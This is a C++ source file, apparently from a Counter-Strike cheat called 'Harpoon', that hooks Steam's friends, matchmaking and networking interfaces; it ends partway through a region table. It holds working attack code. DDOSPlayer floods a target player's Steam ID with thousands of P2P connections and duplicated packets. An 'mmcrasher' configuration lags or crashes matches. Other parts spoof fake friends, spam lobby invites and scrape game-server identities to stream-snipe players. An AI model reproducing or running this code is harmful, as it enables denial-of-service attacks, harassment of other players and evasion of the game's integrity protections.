#pragma once
#include "SteamWorks.h"
#include "../OTHER/GOTVConnect.h"


#include "../../COMPILERDEFINITIONS.h"

//#define STEAMNETWORKINGSOCKETS_STATIC_LINK
//#define STEAMNETWORKINGSOCKETS_FLAT
//#pragma comment(lib,"../../Resource/SteamWorks/redistributable_bin/steam_api.dll")
#include "../../Resource/SteamWorks/steam/steam_api.h"
#include "../../Resource/SteamWorks/steam/steam_api_common.h"
#include "../../Resource/SteamWorks/steam/isteamgamecoordinator.h"
#include "../../Resource/SteamWorks/steam/isteamnetworking.h"
#include "../../Resource/SteamWorks/steam/isteamnetworkingutils.h"
#include "../../Resource/SteamWorks/steam/isteamnetworkingsockets.h"
#include "../../Resource/SteamWorks/steam/isteamnetworkingmessages.h"
#include "../../Resource/SteamWorks/steam/steamnetworkingtypes.h"
#include "../../Resource/SteamWorks/steam/isteamfriends.h"
#include "../../Resource/SteamWorks/steam/isteamuser.h"
#include "../../Resource/SteamWorks/steam/steamclientpublic.h"
#include "../../Resource/SteamWorks/steam/steamclientpublic.h"
#include "../../Hooks.h"

#include "../../Other/CrossCheatTalk.h"
//#define _CRT_SECURE_NO_WARNINGS
//#define _SILENCE_CXX17_ITERATOR_BASE_CLASS_DEPRECATION_WARNING

// When installing protobuf use
// .\vcpkg install protobuf:x86-windows-static-md
// Or compule from source and specify UCRT in cmake to multi dynamic (-D protobuf_BUILD_SHARED_LIBS=ON -D protobuf_MSVC_STATIC_RUNTIME=ON)


#ifndef _DEBUG
#pragma comment(lib,"C:\\Users\\user\\source\\repos\\Harpoon\\Harpoon\\Resource\\Protobuf\\libprotobuf.lib")
#endif
#ifdef _DEBUG
#pragma comment(lib,"C:\\vcpkg\\installed\\x86-windows-static-md\\debug\\lib\\libprotobufd.lib")
#endif

//#pragma comment(lib,"C:\\Users\\user\\source\\repos\\Harpoon\\Harpoon\\Resource\\SteamWorks\\redistributable_bin\\steam_api.dll")

//#pragma comment(lib,"../../Resource/Protobuf/libprotobuf.lib")


template <class T>
std::string DumpProtobufMessage(char* pData, size_t nDataSize)
{
	T ProtoBuf;
	ProtoBuf.ParseFromArray(pData, nDataSize);
	std::string DebugStr = ProtoBuf.DebugString();

	for (int nCurrentPos = 0; nCurrentPos < DebugStr.size(); )
	{
		int nextStepSize = min(DebugStr.size() - nCurrentPos, 200);
		std::string debugsubstring = DebugStr.substr(nCurrentPos, nextStepSize);
		memory->conColorMsg({ 255,255,255,255 }, debugsubstring.c_str());
		nCurrentPos += nextStepSize;
	}

	return "ClientValidationPacket";
}



#include "../../Resource/Protobuf/Headers/cstrike15_gcmessages.pb.h"
#include "../OTHER/Debug.h"
#include <Windows.h>

#include <intrin.h>

//uint32
struct StreamSniper_s {
	WatchableMatchInfo Info;
	uint32_t steamID = 0;
} g_StreamSniper;

bool init = false;

bool hk_SendDataOnSocket(uint32_t hSocket, void* pubData, uint32_t cubData, bool bReliable);

void* hk_SendMessagePtr = nullptr;
void* hk_RetrieveMessagePtr = nullptr;


void* hk_NetworkSocketMessagePtr = nullptr;

//ISteamNetworkingUtils* steamNetworkingUtils;
//ISteamNetworkingSockets* steamNetworkingSockets;
//ISteamNetworkingMessages* steamNetworkingMessages;


SteamNetworkingIdentity ourIdentity;

typedef int64_t(__thiscall* SNPNextThink)(void*, int64_t usecNow);
int64_t __fastcall OurSteamWorks::SNP_GetNextThinkTime(void* ecx, void* edx, int64_t usecNow) {
	int64_t usecNextTime = ((SNPNextThink)memory->oSNP_GetNextThinkTime)(ecx, usecNow);
	if (_ReturnAddress() == (void*)memory->RATLIM_ReturnAddress) {
		return 0;
	}
	else if (GetAsyncKeyState(config->TestShit.fuckKey7)) {
		return usecNextTime;//steamNetworkingUtils->GetLocalTimestamp() + 1;
	}
	return usecNextTime; /* TODO: Remove Assert Spam */
}

#if 1 // PASTED
std::vector<CSteamID> friends;
#include <fstream>

#include <ShlObj.h>

static int nRealFriendCount = 0;
int __fastcall hk_GetFriendCount(void* ecx, void* edx, int iFriendFlags) {
	//Debug::QuickPrint("[FriendSpoof] GetFriendCount();\n");
	/* Set Up Our Friends */
	//static bool init{ false };
	if (true) {
		//init = true;
		friends.clear();
		std::ifstream playerFile;
		char path[MAX_PATH];
		HRESULT hr = SHGetFolderPath(NULL, CSIDL_PERSONAL, NULL,
			SHGFP_TYPE_CURRENT, path);
		strcat(path, "\\Harpoon\\Friends.txt");
		playerFile.open(path);
		int32_t id = 0;
		std::string friendsstr;
		while (getline(playerFile, friendsstr)) {
			try {
				id = std::stoi(friendsstr.c_str());
				friendsstr.erase(std::remove(friendsstr.begin(), friendsstr.end(), '\n'),
					friendsstr.end());
				//Debug::QuickPrint(("Friend ID Is Parsed = " + std::to_string(id)).c_str());
				CSteamID steamid(id, k_EUniversePublic, k_EAccountTypeIndividual);
				//steamid.SetFromString(friendsstr.c_str(), k_EUniversePublic);
				friends.push_back(steamid);

			}
			catch (std::exception& e) {
				Debug::QuickPrint(friendsstr.c_str());
			}
		}
		playerFile.close();
	}


	auto friendcount = 0;

	if (iFriendFlags & k_EFriendFlagAll /* k_EFriendFlagImmediate*/) {
		nRealFriendCount = hooks->steamFriends.callOriginal<int, 3, int>(iFriendFlags);
		friendcount = nRealFriendCount + friends.size();
	}

	//Debug::QuickPrint("[FriendSpoof] Friends: ");
	return friendcount;
}

void __fastcall hk_GetFriendByIndex(void* ecx, void* edx, std::uint64_t* retn, int iFriend, int iFriendFlags) {
	//Debug::QuickPrint("[FriendSpoof] GetFriendByIndex");

	auto id = k_steamIDNil;

	if (iFriendFlags & k_EFriendFlagAll/*k_EFriendFlagImmediate*/) {
		int realFriendCount = nRealFriendCount/*hooks->steamFriends.callOriginal<int, 3, int>(iFriendFlags) + friends.size()*/ ;
		if (iFriend > realFriendCount) {
			iFriend -= realFriendCount;
			id =  friends[iFriend];




		} else if (iFriend >= 0 && ((size_t)iFriend < nRealFriendCount)) {
			hooks->steamFriends.callOriginal<int, 3, std::uint64_t*, int, int>(retn, iFriend, iFriendFlags);
			return;
		}
	}
	//Debug::QuickPrint("[FriendSpoof] Friend:");
	*retn = id.ConvertToUint64();
}

EFriendRelationship __fastcall hk_GetFriendRelationship(void* ecx, void* edx, CSteamID steamIDFriend) {
	return k_EFriendRelationshipFriend;
}
//

EPersonaState __fastcall hk_GetFriendPersonaState(void* ecx, void* edx, CSteamID steamIDFriend) {
	//Debug::QuickPrint("[FriendSpoof] GetFriendPersonaState");
	EPersonaState state = hooks->steamFriends.callOriginal<EPersonaState, 6, CSteamID>(steamIDFriend);
	if(state < k_EPersonaStateOnline)
		return k_EPersonaStateOnline;
	return state;
}


// 49
bool __fastcall hk_InviteUserToGame(void*, void*, CSteamID steamIDFriend, const char* pchConnectString) {

	Debug::QuickPrint(pchConnectString);
	bool ret = hooks->steamFriends.callOriginal<bool, 49, CSteamID, const char*>(steamIDFriend, pchConnectString);
	if (!ret)
		Debug::QuickWarning("Unable To Invite User");

	return ret;


}

bool __fastcall hk_GetFriendGamePlayed(void* ecx, void* edx, CSteamID steamIDFriend, STEAM_OUT_STRUCT() FriendGameInfo_t* pFriendGameInfo) {
	//bool nResult = hooks->steamFriends.callOriginal<EPersonaState, 8, CSteamID, STEAM_OUT_STRUCT() FriendGameInfo_t*>(steamIDFriend, pFriendGameInfo);
	bool nResult = true;
	if (nResult) {
		if (pFriendGameInfo) {
			pFriendGameInfo->m_unGameIP = 3494815037;
			CGameID NewID(730);
			pFriendGameInfo->m_gameID = NewID;
			pFriendGameInfo->m_usGamePort = 3;
			pFriendGameInfo->m_steamIDLobby.SetFromUint64(90144742228812806);
		}
	}
	else {}
	return nResult;
}


#endif
#if 1
#include "../../Resource/Protobuf/Headers/steamnetworkingsockets_messages.pb.h"
//#include "../../Resource/Protobuf/Headers/steamnetworkingsockets_messages_certs.pb.h"
//#include "../../Resource/Protobuf/Headers/steamnetworkingsockets_messages_udp.pb.h"

#include "../../Resource/SteamWorks/steam/isteamnetworkingmessages.h"
__forceinline void DDOSPlayer(CSteamID& SteamID) {
	static uint32_t nSize{ 0 };
	const char* pBuffer{ nullptr };
	static SteamNetworkingIdentity Identity;
	Identity.SetSteamID(SteamID);
	SteamNetworkingConfigValue_t Config;
	if (!pBuffer) {
		Debug::QuickPrint("Setting Up Config");
		pBuffer = (const char*)malloc(1);
		Config.SetInt32(ESteamNetworkingConfigValue::k_ESteamNetworkingConfig_NagleTime, config->mmcrasher.nagleTime * 1000);
		Config.SetInt32(ESteamNetworkingConfigValue::k_ESteamNetworkingConfig_SendRateMax, 0); // Unlimited
		Config.SetInt32(ESteamNetworkingConfigValue::k_ESteamNetworkingConfig_SendBufferSize, config->mmcrasher.bufferSize);
		Config.SetInt32(ESteamNetworkingConfigValue::k_ESteamNetworkingConfig_MTU_PacketSize, config->mmcrasher.MTU);
		Config.SetInt32(ESteamNetworkingConfigValue::k_ESteamNetworkingConfig_FakePacketDup_Send, config->mmcrasher.DupPercent);
		Config.SetInt32(ESteamNetworkingConfigValue::k_ESteamNetworkingConfig_FakePacketDup_TimeMax, 0);
	}

	//steamNetworkingsSockets->
	//steamNetworkingSockets->ConnectP2P(Identity, 0, 0, 0);
	//virtual HSteamNetConnection ConnectP2P(const SteamNetworkingIdentity & identityRemote, int nRemoteVirtualPort, int nOptions, const SteamNetworkingConfigValue_t * pOptions)
	Debug::QuickPrint("DOSSING PLAYER!!!");
	static HSteamNetConnection Conns[6000];
	for (int i = 0; i < 6000; i++) {
		HSteamNetConnection Conn = steamNetworkingSockets->ConnectP2P(Identity,i, 0,&Config);
		Conns[i] = Conn;
		if(i % 100)
			steamNetworkingSockets->RunCallbacks();
	}
	for (int i = 0; i < 6000; i++) {
		steamNetworkingSockets->FlushMessagesOnConnection(Conns[i]);
	}
	for (int i = 0; i < 6000; i++) {
		steamNetworkingSockets->CloseConnection(Conns[i],9,0,1);
	}

	//steamNetworkingUtils->
	//steamNetworkingMessages->SendMessageToUser(Identity, pBuffer, nSize, k_nSteamNetworkingSend_NoNagle | k_nSteamNetworkingSend_NoDelay | k_nSteamNetworkingSend_Reliable | k_nSteamNetworkingSend_AutoRestartBrokenSession, 0);
	//steanNetworkingSockets-
	//free((void*)pBuffer);
}


#include <Windows.h>

void OurSteamWorks::PlayerDOS() {

#if 0
	static std::ifstream playerFile;
	static CSteamID TargetPlayer;
	if (memory->globalVars->tickCount % 500) {
		playerFile.open("C:\\playersnipe.txt");
		char line[10];
		int32_t id = 0;
		std::string nasty;
		while (getline(playerFile, nasty)) {
			try {
				id = std::stoi(nasty);
				nasty.erase(std::remove(nasty.begin(), nasty.end(), '\n'),
					nasty.end());
				//Debug::QuickPrint(("Our ID Is Now = " + std::to_string(id)).c_str());
				TargetPlayer.FullSet(id, k_EUniversePublic, k_EAccountTypeIndividual);
				break;
			}
			catch (std::exception& e) {
				Debug::QuickPrint("Unable To Send!");
				Debug::QuickPrint(nasty.c_str());
			}
		}
		playerFile.close();
	}
	if (true ) {
		if (GetAsyncKeyState(VK_DELETE)) {
			//steamFriends->RequestFriendRichPresence(TargetPlayer);
			//steamFriends->ActivateGameOverlayRemotePlayTogetherInviteDialog(TargetPlayer);
			//g_pSteamMatchmaking->InviteUserToLobby(TargetPlayer);

		}
	}
#endif
}
#endif


std::string GOTVWaitFor = "NEVERINAMILLION";
/* I didn't want to do it this way, but I couldn't figure out how to get the game server's identity elsewhere. Oh well. */
void SteamNetworkingDebugOutputFunction(ESteamNetworkingSocketsDebugOutputType nType, const char* pszMsg) {

#if 0
	if (strstr(pszMsg, "Trying to set next think time")) {
		//steamNetworkingSockets->GetDetailedConnectionStatus()
		return;
	}

	if (strstr(pszMsg, "usecNextAction > usecNow")) {
		return;
	}
#endif
	if (strstr(pszMsg, "< pSendMsg->m_cbSize")) {
		return;
	}

	if (strstr(pszMsg, "Adding SDR ticket") && strstr(pszMsg, GOTVWaitFor.c_str())) {
		GOTVConnect::ConnectToServer(&g_StreamSniper.Info);
	}



	if (strstr(pszMsg, "CMsgSteamDatagramGameserverSessionEstablished")) { /* This makes me surrder in disgust*/
		std::string ourMsg{ pszMsg };
		std::string gameserver_identity_string = ourMsg.substr(0, ourMsg.find("legacy_gameserver_steamid"));
		int pos = gameserver_identity_string.find("gameserver_identity_string");
		gameserver_identity_string.erase(0, pos);
		pos = gameserver_identity_string.find("\"");
		gameserver_identity_string.erase(0, pos);
		gameserver_identity_string.erase(std::remove(gameserver_identity_string.begin(), gameserver_identity_string.end(), '\"'), gameserver_identity_string.end());
		gameserver_identity_string.erase(std::remove(gameserver_identity_string.begin(), gameserver_identity_string.end(), '\n'), gameserver_identity_string.end());
		gameserver_identity_string.erase(std::remove(gameserver_identity_string.begin(), gameserver_identity_string.end(), ' '), gameserver_identity_string.end());

		char buffer[4096];
		steamNetworkingUtils->SteamNetworkingIdentity_ParseString(&ourIdentity, gameserver_identity_string.c_str());	
		steamNetworkingUtils->SteamNetworkingIdentity_ToString(ourIdentity, buffer, 4096);
		memory->conColorMsg({ 255,0,255,255 }, buffer);

		if (ourIdentity.m_eType == k_ESteamNetworkingIdentityType_UnknownType) {
			Debug::QuickWarning("Couldn't Deduce Networking ID Type....");
		}


	}

	if (config->debug.SteamNetworkingDebug && pszMsg) {
		std::string POPID{ "SteamNetworkingSockets --- " };
		memory->conColorMsg({ 255,0,255,255 }, POPID.c_str());
		memory->conColorMsg({ 255,0,255,255 }, pszMsg);
		memory->conColorMsg({ 255,0,255,255 }, "\n");
	}
}

bool inRate = false;
EResult __fastcall SendMessageToConnection(ISteamNetworkingSockets* steamNetworkingSocket, void* edx, HSteamNetConnection hConn, const void* pData, uint32 cbData, int nSendFlags, int64* pOutMessageNumber) {
	EResult ret = hooks->steamNetworkingSockets.callOriginal<EResult, 12, HSteamNetConnection, const void*, uint32, int, int64*>(hConn, pData, cbData, nSendFlags, pOutMessageNumber);
	if (inRate) {
		inRate = false;
		steamNetworkingSocket->FlushMessagesOnConnection(hConn);
	}
	//12
	Debug::QuickPrint("SendMessagesToConnection");
	return ret;
}

HSteamNetConnection __fastcall ConnectToHostedDedicatedServer(void* _this, void* edx, const SteamNetworkingIdentity& identityTarget, int nVirtualPort, int nOptions, const SteamNetworkingConfigValue_t* pOptions) {

	char buffer[4096];
	steamNetworkingUtils->SteamNetworkingIdentity_ToString(identityTarget, buffer, 4096);
	
	std::string outToCon{ "SteamNetworkingUtils::SteamNetworkingIdentity_ToString = " };
	outToCon.append(buffer);
	outToCon.append("\n");
	memory->conColorMsg({ 200,0,255,255 }, outToCon.c_str());
	return hooks->steamNetworkingSockets.callOriginal<HSteamNetConnection, 29, void*, const SteamNetworkingIdentity&, int, int, const SteamNetworkingConfigValue_t*>(_this, identityTarget, nVirtualPort, nOptions, pOptions);
}

int __fastcall ReceiveMessagesOnConnection(void* ecx, void* edx, HSteamNetConnection hConn, SteamNetworkingMessage_t** ppOutMessages, int nMaxMessages) {

	Debug::QuickPrint("ReceiveMessagesOnConnection");
	return hooks->steamNetworkingMessages.callOriginal<int, 1, void*, HSteamNetConnection, SteamNetworkingMessage_t**, int>(ecx, hConn, ppOutMessages, nMaxMessages);
}

//GetLobbyMemberData
const char* __fastcall GetLobbyMemberData(void* ecx, void* edx, CSteamID LobbyID, CSteamID PlayerID, const char* pchKey)
{
	const char* Ret = hooks->steamMatchmaking.callOriginal<const char*, 24, void*, CSteamID, CSteamID, const char*>(ecx, LobbyID, PlayerID, pchKey);

	const char* szRet = "[No Return]";

	if (Ret && strlen(Ret))
		szRet = Ret;

	VCON("ISteamMatchmaking::GetLobbyMemberData was called with pchKey %s and returned pchValue %s back!\n", pchKey, szRet);

	return Ret;
}

void __fastcall SetLobbyMemberData(void* ecx, void* edx, CSteamID steamIDLobby, const char* pchKey, const char* pchValue)
{

	VCON("ISteamMatchmaking::SetLobbyMemberData Was Called With pchKey %s and pchValue %s\n", pchKey, pchValue);

	hooks->steamMatchmaking.callOriginal<void, 25, void*, CSteamID, const char*, const char*>(ecx, steamIDLobby, pchKey, pchValue);
}


//	virtual EResult AcceptConnection( HSteamNetConnection hConn ) = 0;


void __fastcall AcceptConnection(void* ecx, void* edx, HSteamNetConnection hConn)
{
	VCON("Accept Connection Called with Connection ID %d\n", hConn);


	//hooks->steamNetworkingSockets<void, 4, HSteamNetConnection>(ecx, hConn);
	return;
}


void __fastcall CreateLobby(void* ecx, void* edx, ELobbyType eLobbyType, int cMaxMembers)
{
	CON("Create Lobby Called");

}



bool __fastcall SendP2PPacket(void* ecx, void* edx, CSteamID steamIDRemote, const void* pubData, uint32 cubData, EP2PSend eP2PSendType, int nChannel = 0) {

	CON("SendP2PPacket");

	if (!config->debug.allowcalloriginal)
		return true;


	return hooks->steamNetworking.callOriginal<bool, 0, CSteamID, const void*, uint32_t, EP2PSend, int>(steamIDRemote, pubData, cubData, eP2PSendType, nChannel);

}

#include "../../Other/CrossCheatTalk.h"
#include "../../MemAlloc.h"
void OurSteamWorks::Init() {

	if (steam_api = reinterpret_cast<std::uintptr_t>(GetModuleHandle("steam_api.dll"))) {

#define STEAM_FUNC(NAME) ((decltype(&NAME))GetProcAddress( reinterpret_cast<HMODULE>(OurSteamWorks::steam_api), #NAME))
		const auto user = STEAM_FUNC(SteamAPI_GetHSteamUser)();
		const auto pipe = STEAM_FUNC(SteamAPI_GetHSteamPipe)();
		const auto steam_client = STEAM_FUNC(SteamClient)();
#undef STEAM_FUNC	
		const auto gameCoordinator = steam_client->GetISteamGenericInterface(user, pipe, STEAMGAMECOORDINATOR_INTERFACE_VERSION);


		HMODULE moduleHandle = GetModuleHandleA("steamnetworkingsockets.dll");

		if (!moduleHandle) {
			throw std::exception("Module Handle was nullptr!");
		}

		FARPROC procAddr = GetProcAddress(GetModuleHandleA("steamnetworkingsockets.dll"), "SteamNetworkingUtils_LibV3");
		if (procAddr) {
			steamNetworkingUtils = ((ISteamNetworkingUtils * (*)())procAddr)();// (ISteamNetworkingUtils * )steam_client->GetISteamGenericInterface(user, pipe, STEAMNETWORKINGUTILS_INTERFACE_VERSION);
		}
		else {
			throw std::exception("procAddr was Invalid");
		}
		steamNetworkingSockets = ((ISteamNetworkingSockets * (*)())GetProcAddress(moduleHandle, "SteamNetworkingSockets_LibV9"))();
		steamNetworkingMessages = ((ISteamNetworkingMessages * (*)())GetProcAddress(moduleHandle, "SteamNetworkingMessages_LibV2"))();
		g_pSteamUtils = steam_client->GetISteamUtils(pipe, STEAMUTILS_INTERFACE_VERSION);

		g_pSteamUser = (ISteamUser*)steam_client->GetISteamGenericInterface(user,pipe, STEAMUSER_INTERFACE_VERSION);
		g_pSteamHTTP = (ISteamHTTP*)steam_client->GetISteamHTTP(user, pipe, STEAMHTTP_INTERFACE_VERSION);
		g_pSteamMatchmaking = (ISteamMatchmaking*)steam_client->GetISteamHTTP(user, pipe, STEAMMATCHMAKING_INTERFACE_VERSION);

		g_pSteamNetworking = (ISteamNetworking*)steam_client->GetISteamNetworking(user, pipe, STEAMNETWORKING_INTERFACE_VERSION);

		//g_pSteamNetworkingMessages = steamNetworkingMessages;
		//g_pSteamNetworkingSockets = steamNetworkingSockets;
		//g_pSteamNetworkingUtils = steamNetworkingUtils;


		//STEAMFRIENDS_INTERFACE_VERSION
																																							 //ISteamNetworkingMessage
		
		steamNetworkingUtils->SetDebugOutputFunction(k_ESteamNetworkingSocketsDebugOutputType_Everything, SteamNetworkingDebugOutputFunction);

		steamFriends = steam_client->GetISteamFriends(user, pipe, STEAMFRIENDS_INTERFACE_VERSION);
		const auto steamNetworking = steam_client->GetISteamNetworking(user, pipe, STEAMNETWORKING_INTERFACE_VERSION);
		hooks->gameCoordinator.init(gameCoordinator);
		hooks->gameCoordinator.hookAt(0, hk_SendMessage);
		hooks->gameCoordinator.hookAt(2, hk_RetrieveMessage);
		hooks->steamFriends.init(steamFriends);

		hooks->steamMatchmaking.init(g_pSteamMatchmaking);
		hooks->steamNetworkingSockets.init(steamNetworkingSockets);
		hooks->steamNetworking.init(steamNetworking);
#if 1
		hooks->steamFriends.hookAt(3, hk_GetFriendCount);
		hooks->steamFriends.hookAt(4, hk_GetFriendByIndex);
		hooks->steamFriends.hookAt(5, hk_GetFriendRelationship);
		hooks->steamFriends.hookAt(6, hk_GetFriendPersonaState);
		hooks->steamFriends.hookAt(8, hk_GetFriendGamePlayed);
		hooks->steamFriends.hookAt(49, hk_InviteUserToGame);
#endif


#if 1
		//hooks->steamMatchmaking.hookAt(24, GetLobbyMemberData);
		//hooks->steamMatchmaking.hookAt(25, SetLobbyMemberData);

		// 13 CreateLobby
		//hooks->steamMatchmaking.hookAt(13, CreateLobby);


		//hooks->steamNetworkingSockets.hookAt(4, AcceptConnection);

		//hooks->steamNetworking.hookAt(0, SendP2PPacket);






#endif




		hk_SendMessagePtr = (void*)hooks->gameCoordinator.getOriginalPtr(0);
		hk_RetrieveMessagePtr = (void*)hooks->gameCoordinator.getOriginalPtr(2);
		//hooks->steamNetworkingSockets.init(steamNetworkingSockets);
		//hooks->steamNetworkingSockets.hookAt(12, hk_SendMessageToConnection);

		//hooks->steamNetworking.init(steamNetworking);

		//hooks->steamNetworking.hookAt(12, hk_SendDataOnSocket);
		
		hooks->steamNetworkingSockets.init(steamNetworkingUtils);
		//hooks->steamNetworkingMessages.init(steamNetworkingMessages);
		//hooks->steamNetworkingSockets.hookAt(29,ConnectToHostedDedicatedServer);
		//hooks->steamNetworkingSockets.hookAt(12, SendMessageToConnection);
		//hooks->steamNetworkingMessages.hookAt(1, ReceiveMessagesOnConnection);
		// 15



		//

		//memory->memalloc->m
		//g_pHarpoonNetworkingSockets = new IHarpoonNetworkingSockets;
		//ISteamNetworkingSockets* pSockets = (ISteamNetworkingSockets **)Memory::findPattern_ex(L"engine", "\xA3????\x51\x8B\x01");
		//g_pSteamNetworkingSockets = *pSockets;
		//*pSockets = (ISteamNetworkingSockets * )g_pHarpoonNetworkingSockets;
		//Debug::QuickWarning("Set g_pSteamNetworkingSockets...");

		CON("SteamNetworkingUtil Setting No P2P Transport!\n");
		steamNetworkingUtils->SetGlobalConfigValueInt32(ESteamNetworkingConfigValue::k_ESteamNetworkingConfig_P2P_Transport_ICE_Enable, k_nSteamNetworkingConfig_P2P_Transport_ICE_Enable_Relay);

	}
}

//void OurSteamWorks::InviteSpammer() {

//}



/*

	struct MMCrasher {
		bool enabled = false;
		bool toggleKey = false;
		int key{ false };
		int timesToPostpone = 0;
		int timesToSend = 500;
		int bufferSize = INT_MAX;
		int nagleTime = 15;
		int MTU = INT_MAX;
		int DupPercent = 100;
		bool cooldownMaker = false;
		bool annoyance = false;
		int annoyanceKey = 0;
		float annoyanceOn = .5f;
		float annoyanceOff = 8.f;
	} mmcrasher;

*/

#ifndef BLAH
bool OurSteamWorks::CheckPingUpToDate(bool LAG) {

	//steamNetworkingUtils->SetGlobalConfigValueInt32(ESteamNetworkingConfigValue::k_ESteamNetworkingConfig_FakePacketLag_Recv, 1850);
	if (LAG) {
		steamNetworkingUtils->SetGlobalConfigValueInt32(ESteamNetworkingConfigValue::k_ESteamNetworkingConfig_NagleTime, config->mmcrasher.nagleTime * 1000);
		steamNetworkingUtils->SetGlobalConfigValueInt32(ESteamNetworkingConfigValue::k_ESteamNetworkingConfig_SendRateMax, 0); // Unlimited
		steamNetworkingUtils->SetGlobalConfigValueInt32(ESteamNetworkingConfigValue::k_ESteamNetworkingConfig_SendBufferSize, config->mmcrasher.bufferSize);
		steamNetworkingUtils->SetGlobalConfigValueInt32(ESteamNetworkingConfigValue::k_ESteamNetworkingConfig_MTU_PacketSize, config->mmcrasher.MTU);
		steamNetworkingUtils->SetGlobalConfigValueInt32(ESteamNetworkingConfigValue::k_ESteamNetworkingConfig_FakePacketDup_Send, config->mmcrasher.DupPercent);
		steamNetworkingUtils->SetGlobalConfigValueInt32(ESteamNetworkingConfigValue::k_ESteamNetworkingConfig_FakePacketDup_TimeMax, 0);

		
		

	}
	else {
		inRate = true;
		steamNetworkingUtils->SetGlobalConfigValueInt32(ESteamNetworkingConfigValue::k_ESteamNetworkingConfig_NagleTime, 0);
		steamNetworkingUtils->SetGlobalConfigValueInt32(ESteamNetworkingConfigValue::k_ESteamNetworkingConfig_FakePacketDup_Send, 0);
	}

		// k_ESteamNetworkingConfig_FakePacketDup_Send
		//

	return true;
}

#endif

#if 0
auto lobby_stuff::meme_inviter(bool get_collection_size) -> uint16_t {
#pragma pack(push, 1)
	struct item_t {
		uint16_t idx_next_0, unk_idx_2, idx_prev_4, unk_val_6;
		uint64_t steam_id_8;
		uint32_t* unk_ptr_16;
	}; //Size: 0x0014
#pragma pack(pop)

	static const auto collection = *(uint32_t**)(Utils::PatternScan(GetModuleHandleA("client_panorama.dll"), "8B 35 ? ? ? ? 66 3B D0 74 07") + 2);

	if (*collection) {
		auto invite_to_lobby = [](uint64_t id) {
			class IMatchFramework; // GetMatchSession:13
			class ISteamMatchmaking; // InviteUserToLobby:16

			using GetLobbyId = uint64_t(__thiscall*)(void*);
			using GetMatchSession = uintptr_t * (__thiscall*)(IMatchFramework*);
			using InviteUserToLobby = bool(__thiscall*)(ISteamMatchmaking*, uint64_t, uint64_t);

			static const auto match_framework = **reinterpret_cast<IMatchFramework***>(Utils::PatternScan(GetModuleHandleA("client_panorama.dll"), "8B 0D ? ? ? ? 8B 01 FF 50 2C 8D 4B 18") + 0x2);
			static const auto steam_matchmaking = **reinterpret_cast<ISteamMatchmaking***>(Utils::PatternScan(GetModuleHandleA("client_panorama.dll"), "8B 3D ? ? ? ? 83 EC 08 8B 4D 08 8B C4") + 0x2);

			const auto match_session = CallVFunction<GetMatchSession>(match_framework, 13)(match_framework);
			if (match_session) {
				const uint64_t my_lobby_id = CallVFunction<GetLobbyId>(match_session, 4)(match_session);
				CallVFunction<InviteUserToLobby>(steam_matchmaking, 16)(steam_matchmaking, my_lobby_id, id);
			}
		};

		auto max_index = ((uint16_t*)collection)[9];

		if (get_collection_size)
			return max_index;

		for (uint16_t i = 0; i <= max_index; ++i) {
			auto item = &((item_t*)*collection)[i];
			invite_to_lobby(item->steam_id_8);
		}

		return max_index;
	}

#endif
// nIndex is a arg because we really want to end up using a offset array or whatever
template <class T, class ... Types>
__forceinline T CallVirtualFunction(void* _this, int nIndex, Types ... vals) {
		return ((*reinterpret_cast<T(__thiscall***)(void*, Types...)>(_this))[nIndex])(_this, vals...);
}
#include "../../SDK/OsirisSDK/KeyValues.h"
using GetLobbyId = uint64_t(__thiscall*)(void*);
__declspec(noinline) void OurSteamWorks::InviteSpam() {
	int nTest = 0;

	static const auto match_framework = **reinterpret_cast<IMatchFramework***>(memory->findPattern_ex(L"client", "\x8B\x0D????\x8B\x01\xFF\x50\x2C\x8D\x4B\x18") + 0x2);
	if (!match_framework)
		return;

	//const auto match_session = CallVirtualFunction<uintptr_t*>(match_framework, 13);
	IMatchSession* match_session = interfaces->matchFramework->GetMatchSession();

	if (!match_session) {


		interfaces->matchFramework->CreateSession(nullptr);

		match_session = interfaces->matchFramework->GetMatchSession();

		if (!match_session)
		{
			int n = 0;
			n++;
			//CON("No Match Session!!!");
			return;
		}
	}

	const uint64_t my_lobby_id = CallVirtualFunction<uint64_t>(match_session, 4);
	for (uint32_t ID : OurSteamWorks::m_vIDs)
	{
			g_pSteamMatchmaking->InviteUserToLobby(my_lobby_id, CSteamID(ID, k_EUniversePublic, k_EAccountTypeIndividual));
	}
	
}


#define _SHOULD_CALL_ORIGINAL -1


std::map<std::string, std::pair<std::string, int>> RegionMap{
 { "syd" ,  std::pair<std::string,int>{"Sydney (Australia South-East)", 0} },
 { "tsnt",  std::pair<std::string,int>{"Beijing (Asia North-East)", 1} },
 { "bom" ,  std::pair<std::string,int>{"Bombay (India West)", 2} },
 { "pwj" ,  std::pair<std::string,int>{"Cangzhou (Asia North-East)", 3} },
 { "maa" ,  std::pair<std::string,int>{"Chennai (India South-East)", 4} },
 { "pwu" ,  std::pair<std::string,int>{"Dongcheng Qu (Asia Central)", 5} },
 { "dxb" ,  std::pair<std::string,int>{"Dubai (Middle-East)", 6} },
 { "canm",  std::pair<std::string,int>{"Guangzhou 1 (Asia East)", 7} },
 { "cant",  std::pair<std::string,int>{"Guangzhou 2 (Asia East)", 8} },
 { "canu",  std::pair<std::string,int>{"Guangzhou 3 (Asia East)", 9} },
 { "pwg" ,  std::pair<std::string,int>{"Guangzhou 4 (Asua East)", 10} },
 { "hkg" ,  std::pair<std::string,int>{"Hong Kong (Asia East)", 11} },
 { "pww" ,  std::pair<std::string,int>{"Hongshan Qu (Asia South-East)", 12} },
 { "pwt" ,  std::pair<std::string,int>{"Huangpu Qu (Asia East)", 13} },
 { "man" ,  std::pair<std::string,int>{"Manilla (Asia South-East)", 14} },
 { "can" ,  std::pair<std::string,int>{"Qingcheng (Asia East)", 15} },
 { "sha" ,  std::pair<std::string,int>{"Shanghai 1 (Asia East)", 16} },
 { "shau",  std::pair<std::string,int>{"Shanghai 2 (Asia East)", 17} },
 { "sgp" ,  std::pair<std::string,int>{"Singapore (Asia South-East)", 18} },
 { "tsnm",  std::pair<std::string,int>{"Tianjin 1 (Asia North-East)", 19} },
 { "tsnu",  std::pair<std::string,int>{"Tianjin 2 (Asia North-East)", 20} },
 { "tyo" ,  std::pair<std::string,int>{"Tokyo 1 (Asia East)", 21} },
 { "tyo1",  std::pair<std::string,int>{"Tokyo 2 (Asia East)", 22} },
 { "tsn" ,  std::pair<std::string,int>{"Xianghe Xian (Asia North-East)", 23} },
 { "ams" ,  std::pair<std::string,int>{"Amsterdam (EU West)", 24} },
 { "fra" ,  std::pair<std::string,int>{"Frankfurt (EU West)", 25} },
 { "ghel",  std::pair<std::string,int>{"Hamina (EU North)", 26} },
 { "lhr" ,  std::pair<std::string,int>{"London (EU North)", 27} },
